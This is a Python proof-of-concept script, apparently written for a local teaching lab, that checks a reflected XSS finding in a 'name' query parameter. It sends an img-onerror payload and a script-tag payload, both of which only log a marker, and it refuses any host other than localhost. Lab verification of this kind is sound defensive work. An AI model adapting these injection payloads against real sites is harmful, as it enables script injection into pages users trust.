#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""XSS-003 反射型 XSS 无害验证草案（需人工适配）。

仅用于本地授权教学靶场。默认只允许 localhost / 127.0.0.1 / ::1。
参数名 name 与 GET 方法来自被审计片段；页面路径以 --url 由操作者按实际部署提供。
"""

import argparse
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

MARKER = "LLM_LAB_XSS"
DEFAULT_PAYLOAD = "<img src=x onerror=console.log('%s')>" % MARKER
CONTROL_PAYLOAD = "<script>console.log('%s')</script>" % MARKER


class NoRedirect(urllib.request.HTTPRedirectHandler):
    """拒绝自动跟随重定向，避免把测试带到未授权位置。"""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def build_target(url, param, payload):
    parts = urllib.parse.urlsplit(url)
    query = [(k, v) for (k, v) in urllib.parse.parse_qsl(parts.query, keep_blank_values=True) if k != param]
    query.append((param, payload))
    return urllib.parse.urlunsplit(
        (parts.scheme, parts.netloc, parts.path, urllib.parse.urlencode(query), parts.fragment)
    )


def read_cookie(path):
    if not path:
        return None
    with open(path, "r", encoding="utf-8") as handle:
        return handle.read().strip()


def fetch(url, timeout, cookie):
    headers = {"User-Agent": "LLM-Lab-XSS003/1.0"}
    if cookie:
        headers["Cookie"] = cookie
    request = urllib.request.Request(url, method="GET", headers=headers)
    opener = urllib.request.build_opener(NoRedirect)
    with opener.open(request, timeout=timeout) as response:
        body = response.read()
        charset = response.headers.get_content_charset() or "utf-8"
        return response.status, body.decode(charset, errors="replace")


def hello_region(html):
    match = re.search(r"<pre>\s*Hello\s*(.*?)</pre>", html, re.S | re.I)
    return match.group(1) if match else None


def describe(region, payload):
    if region is None:
        return "未定位到 <pre>Hello ...</pre> 区域；页面路径、登录跳转或渲染结构需人工适配"
    raw = payload in region
    encoded = ("&lt;" in region or "&gt;" in region)
    return "区域内容=%r | 原样包含载荷=%s | 出现HTML实体编码=%s" % (region, raw, encoded)


def main():
    parser = argparse.ArgumentParser(description="XSS-003 无害反射型 XSS 验证草案")
    parser.add_argument("--url", required=True, help="被审计页面完整URL；路径按实际部署填写")
    parser.add_argument("--param", default="name", help="查询参数名，默认 name（来自 $_GET['name']）")
    parser.add_argument("--payload", default=DEFAULT_PAYLOAD, help="无害测试载荷")
    parser.add_argument("--cookie-file", default=None, help="可选：一行 Cookie 头的本地文件；内容不打印")
    parser.add_argument("--timeout", type=float, default=10.0, help="请求超时秒数")
    args = parser.parse_args()

    parts = urllib.parse.urlsplit(args.url)
    host = (parts.hostname or "").lower()
    if parts.scheme not in ("http", "https"):
        print("[前置条件失败] 仅支持 http/https，收到 scheme=%r" % parts.scheme, file=sys.stderr)
        return 3
    if host not in ("127.0.0.1", "localhost", "::1"):
        print("[前置条件失败] 仅允许本地授权地址，收到 host=%r" % host, file=sys.stderr)
        return 3

    try:
        cookie = read_cookie(args.cookie_file)
    except OSError as exc:
        print("[环境失败] 读取 cookie 文件失败: %s" % exc, file=sys.stderr)
        return 5

    base_url = build_target(args.url, args.param, "LLM_LAB_BASELINE")
    try:
        base_status, base_body = fetch(base_url, args.timeout, cookie)
    except urllib.error.HTTPError as exc:
        print("[认证或HTTP前置条件失败] 基线请求 HTTP %s；可能是登录重定向，需人工取得有效会话" % exc.code)
        return 4
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        print("[环境失败] 基线请求异常: %s" % exc)
        return 5
    print("[基线] HTTP %s | Hello 区域: %r" % (base_status, hello_region(base_body)))

    test_url = build_target(args.url, args.param, args.payload)
    try:
        test_status, test_body = fetch(test_url, args.timeout, cookie)
    except urllib.error.HTTPError as exc:
        print("[认证或HTTP前置条件失败] 测试请求 HTTP %s" % exc.code)
        return 4
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        print("[环境失败] 测试请求异常: %s" % exc)
        return 5

    region = hello_region(test_body)
    print("[测试] URL=%s" % test_url)
    print("[测试] HTTP %s | %s" % (test_status, describe(region, args.payload)))

    control_url = build_target(args.url, args.param, CONTROL_PAYLOAD)
    try:
        control_status, control_body = fetch(control_url, args.timeout, cookie)
        print("[对照] HTTP %s | Hello 区域: %r" % (control_status, hello_region(control_body)))
    except (urllib.error.HTTPError, urllib.error.URLError, TimeoutError, OSError) as exc:
        print("[对照] 对照请求失败: %s" % exc)

    print("[人工观察] 在浏览器打开上面的测试 URL，确认控制台输出 %s 且页面显示破图；HTTP 响应本身不证明执行。" % MARKER)
    if region is not None and args.payload in region:
        print("[静态观察] 载荷在目标区域未被过滤或编码，与片段中仅匹配 script 字母序列的黑名单一致。")
        return 0
    print("[静态观察] 未观察到原样载荷；不能据此断言安全，需核对路径、认证、代理与最终输出编码。")
    return 2


if __name__ == "__main__":
    sys.exit(main())
